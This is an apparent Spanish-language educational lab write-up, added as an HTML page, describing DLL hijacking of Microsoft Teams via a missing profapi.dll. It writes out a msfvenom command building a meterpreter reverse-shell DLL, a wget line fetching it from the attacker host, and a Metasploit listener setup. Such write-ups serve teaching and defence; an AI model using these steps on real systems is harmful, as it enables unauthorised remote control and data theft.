@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Elevación de servicios DLL Hijacking - Ernesto Villar</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="article-style.css">
+</head>
+<body>
+  <nav class="navbar">
+    <div class="nav-left">
+      <a href="index.html" style="text-decoration: none; color: inherit;"><span class="nav-logo">Ernesto Villar</span></a>
+    </div>
+    <div class="nav-right">
+      <ul>
+        <li><a href="#" class="active">Documentación</a></li>
+        <li><a href="ernestoo-v.github.io-main/pdf/dll_hijacking.pdf" download class="download-btn" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 8px 16px; border-radius: 6px; text-decoration: none; display: inline-flex; align-items: center; gap: 8px; font-weight: 500; transition: transform 0.2s, box-shadow 0.2s;" onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 4px 12px rgba(102, 126, 234, 0.4)'" onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='none'">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+            <polyline points="7 10 12 15 17 10"></polyline>
+            <line x1="12" y1="15" x2="12" y2="3"></line>
+          </svg>
+          Descargar PDF
+        </a></li>
+      </ul>
+    </div>
+  </nav>
+
+  <article class="article-container">
+    <header class="article-header">
+      <h1 class="article-title">Elevación de servicios</h1>
+      <p class="article-subtitle">DLL Hijacking</p>
+      <div class="article-meta">
+        <span class="author">Por Ernesto Villar</span>
+      </div>
+    </header>
+
+    <nav class="table-of-contents">
+      <h2>Contenido</h2>
+      <ul>
+        <li><a href="#resumen">Resumen</a></li>
+        <li><a href="#pasos">Pasos del Ataque</a>
+          <ul>
+            <li><a href="#generacion-dll">Generación de la DLL Maliciosa</a></li>
+            <li><a href="#preparacion">Preparación del Entorno</a></li>
+            <li><a href="#deteccion">Detección de Oportunidades con Procmon</a></li>
+            <li><a href="#transferencia">Transferencia y Posicionamiento de la DLL</a></li>
+            <li><a href="#listener">Configuración del Listener en Metasploit</a></li>
+            <li><a href="#ejecucion">Ejecución y Compromiso</a></li>
+          </ul>
+        </li>
+      </ul>
+    </nav>
+
+    <section id="resumen" class="article-section">
+      <h2>Resumen</h2>
+      <p>El ataque de <strong>DLL Hijacking</strong> explota el mecanismo de carga de bibliotecas dinámicas (DLL) en sistemas Windows. Cuando una aplicación intenta cargar una DLL que no está presente en los directorios esperados, el sistema puede recurrir a ubicaciones alternativas. Si el atacante puede ubicar una DLL con el mismo nombre en una ruta accesible, esta puede ser cargada, permitiendo la ejecución de código malicioso con los privilegios del proceso vulnerable.</p>
+      
+      <p>Este informe describe la ejecución de un ataque de DLL Hijacking llevado a cabo desde una máquina Kali Linux contra una máquina Windows, utilizando como vector vulnerable la aplicación Microsoft Teams.</p>
+    </section>
+
+    <section id="pasos" class="article-section">
+      <h2>Pasos del Ataque</h2>
+
+      <div id="generacion-dll" class="subsection">
+        <h3>Generación de la DLL Maliciosa</h3>
+        
+        <p>Para generar la carga útil, se utilizó <strong>msfvenom</strong>, herramienta incluida en el framework Metasploit. La DLL generada incluía una reverse shell mediante el payload <code>meterpreter/reverse_tcp</code>. La orden ejecutada fue la siguiente:</p>
+
+        <div class="command-block">
+          <pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.6 LPORT=4444 -f dll -o evil.dll</code></pre>
+        </div>
+
+        <div class="config-section">
+          <div class="config-item">
+            <div class="config-explanation">
+              <p><strong>LHOST</strong> y <strong>LPORT</strong> se configuraron con la dirección IP y el puerto de escucha de la máquina atacante.</p>
+            </div>
+          </div>
+
+          <div class="config-item">
+            <div class="config-explanation">
+              <p>El parámetro <code>-f dll</code> especificó el formato de salida como archivo DLL.</p>
+            </div>
+          </div>
+
+          <div class="config-item">
+            <div class="config-explanation">
+              <p>El archivo se guardó con el nombre <code>evil.dll</code>.</p>
+            </div>
+          </div>
+        </div>
+
+        <!-- Añadida imagen 1: msfvenom output -->
+        <div class="image-container">
+          <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2018.39.06-AkxPSAjNn1qUPk1eUlAjComeLUDq2s.png" alt="Comando msfvenom generando DLL maliciosa" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+          <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Generación de la DLL maliciosa con msfvenom</p>
+        </div>
+      </div>
+
+      <div id="preparacion" class="subsection">
+        <h3>Preparación del Entorno</h3>
+        
+        <p>Para facilitar la transferencia de archivos, se levantó un servidor HTTP local en la máquina Kali mediante Python asegurándonos de que ambas máquinas se encuentran en la misma red:</p>
+
+        <div class="command-block">
+          <pre><code>python3 -m http.server 8081</code></pre>
+        </div>
+
+        <!-- Añadida imagen 2: Python HTTP server -->
+        <div class="image-container">
+          <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2018.39.15-m1VT0UUOmwtg443e3ld5EJHHW3zNOd.png" alt="Servidor HTTP Python en ejecución" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+          <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Servidor HTTP local para transferencia de archivos</p>
+        </div>
+      </div>
+
+      <div id="deteccion" class="subsection">
+        <h3>Detección de Oportunidades con Procmon</h3>
+        
+        <p>En la máquina Windows se utilizó la herramienta <strong>Process Monitor (Procmon)</strong> de Sysinternals para identificar intentos de carga de DLL fallidas. Se configuraron los siguientes filtros:</p>
+
+        <div class="config-section">
+          <div class="config-item">
+            <div class="config-explanation">
+              <p><strong>Path ends with .dll</strong></p>
+            </div>
+          </div>
+
+          <div class="config-item">
+            <div class="config-explanation">
+              <p><strong>Result contains NAME NOT FOUND</strong></p>
+            </div>
+          </div>
+        </div>
+
+        <!-- Añadida imagen 3: Procmon filter "Path ends with .dll" -->
+        <div class="image-container">
+          <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2018.39.24-cuRDwkCXbk4qV9Ej8wK2Hm5aVj9iCb.png" alt="Configuración de filtro Path ends with .dll" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+          <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Filtro: Path ends with .dll</p>
+        </div>
+
+        <!-- Añadida imagen 4: Procmon filter "Result contains NAME NOT FOUND" -->
+        <div class="image-container">
+          <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2018.39.37-dDbpJmo4KZG3BNAm5L8ridlOdNxYyU.png" alt="Configuración de filtro Result contains NAME NOT FOUND" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+          <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Filtro: Result contains NAME NOT FOUND</p>
+        </div>
+
+        <!-- Añadida imagen 5: Procmon results showing DLL attempts -->
+        <div class="image-container">
+          <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2018.39.44-sS5ur6k6BOy2FOPtQX6NzPx3GUMvd7.png" alt="Resultados de Process Monitor mostrando intentos de carga de DLL" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+          <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Resultados de Process Monitor con filtros aplicados</p>
+        </div>
+
+        <p>Esto permitió observar qué DLLs eran solicitadas por procesos pero no estaban presentes en el sistema. En este caso, se detectó que el proceso de Microsoft Teams intentaba cargar la DLL <code>profapi.dll</code> sin éxito.</p>
+
+        <!-- Añadida imagen 6: Procmon Event Properties showing profapi.dll -->
+        <div class="image-container">
+          <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2018.39.56-iKMDSm81eCKfQiIB82yuFSuVJ7ZS1h.png" alt="Propiedades del evento mostrando profapi.dll no encontrada" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+          <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Microsoft Teams intentando cargar profapi.dll sin éxito</p>
+        </div>
+      </div>
+
+      <div id="transferencia" class="subsection">
+        <h3>Transferencia y Posicionamiento de la DLL</h3>
+        
+        <p>Aprovechando la ausencia de <code>profapi.dll</code>, se procedió a transferir la DLL maliciosa desde Kali a la ruta correspondiente dentro del perfil de usuario en Windows:</p>
+
+        <!-- Añadida nueva imagen mostrando las propiedades del evento profapi.dll -->
+        <div class="image-container">
+          <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2018.51.39-XvntL0UP8C7HFRJAidz65NQXC7D7Fy.png" alt="Propiedades del evento mostrando profapi.dll no encontrada" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+          <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Detalles del evento: profapi.dll NAME NOT FOUND</p>
+        </div>
+
+        <div class="command-block">
+          <pre><code>wget http://10.0.2.6:8081/evil.dll -o "C:\Users\jquerito\AppData\Local\Microsoft\Teams\current\profapi.dll"</code></pre>
+        </div>
+
+        <!-- Movida imagen del comando wget después del bloque de comando -->
+        <div class="image-container">
+          <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2018.40.03-uoa1LuWDKYnKLsRvTt1Z8Mh1Z4311q.png" alt="Comando wget descargando la DLL maliciosa" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+          <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Transferencia de la DLL maliciosa a la máquina Windows</p>
+        </div>
+
+        <div class="info-box">
+          <p>Este directorio es accesible por el usuario, lo que permite colocar archivos sin necesidad de privilegios elevados. Además, se renombró la DLL maliciosa como <code>profapi.dll</code> para que fuera detectada y cargada por el proceso.</p>
+        </div>
+      </div>
+
+      <div id="listener" class="subsection">
+        <h3>Configuración del Listener en Metasploit</h3>
+        
+        <p>En la máquina atacante, se configuró el módulo <strong>handler</strong> de Metasploit para recibir la conexión inversa cuando se ejecutara la DLL:</p>
+
+        <div class="command-block">
+          <pre><code>use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 10.0.2.6
+set LPORT 4444
+exploit</code></pre>
+        </div>
+
+        <!-- Añadida imagen 8: Metasploit handler configuration -->
+        <div class="image-container">
+          <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2018.40.10-VAEjbU2kknSVdBp63YdMDuyH99MT4o.png" alt="Configuración del handler en Metasploit" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+          <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Configuración del listener en Metasploit y sesión establecida</p>
+        </div>
+      </div>
+
+      <div id="ejecucion" class="subsection">
+        <h3>Ejecución y Compromiso</h3>
+        
+        <p>Al ejecutar la aplicación Microsoft Teams en la máquina Windows, el proceso buscó cargar la DLL <code>profapi.dll</code>. Al encontrar la versión maliciosa colocada en el directorio del usuario, se ejecutó el payload embebido, estableciendo una sesión Meterpreter en la máquina atacante.</p>
+
+        <!-- Añadida imagen 9: Meterpreter ls command -->
+        <div class="image-container">
+          <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2018.40.19-Q7jTgVD0P30tjlEzNPBihKeDxw4q4j.png" alt="Sesión Meterpreter mostrando listado de directorio" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+          <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Sesión Meterpreter con acceso al directorio de Teams</p>
+        </div>
+
+        <!-- Añadida imagen 10: Meterpreter shell with whoami -->
+        <div class="image-container">
+          <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Captura%20de%20pantalla%202025-10-27%20a%20las%2018.40.26-UvYuUvmXpm85CNLwNJKWb3IV0mA7b7.png" alt="Sesión Meterpreter activa con comando whoami" style="max-width: 100%; height: auto; border-radius: 8px; margin: 20px 0;">
+          <p style="text-align: center; color: #a1a1aa; font-size: 0.9rem; margin-top: 0.5rem;">Sesión Meterpreter activa con acceso completo al sistema</p>
+        </div>
+
+        <div class="info-box">
+          <h4>Resultado del Ataque</h4>
+          <p>El atacante obtuvo acceso completo a la máquina Windows con los privilegios del usuario que ejecutó Microsoft Teams. Desde la sesión Meterpreter, es posible realizar múltiples acciones como:</p>
+          <ul>
+            <li>Escalada de privilegios</li>
+            <li>Captura de credenciales</li>
+            <li>Movimiento lateral en la red</li>
+            <li>Exfiltración de datos</li>
+            <li>Instalación de persistencia</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <footer class="article-footer">
+      <p>Documento educativo sobre seguridad de sistemas - Ernesto Villar</p>
+    </footer>
+  </article>
+</body>
+</html>
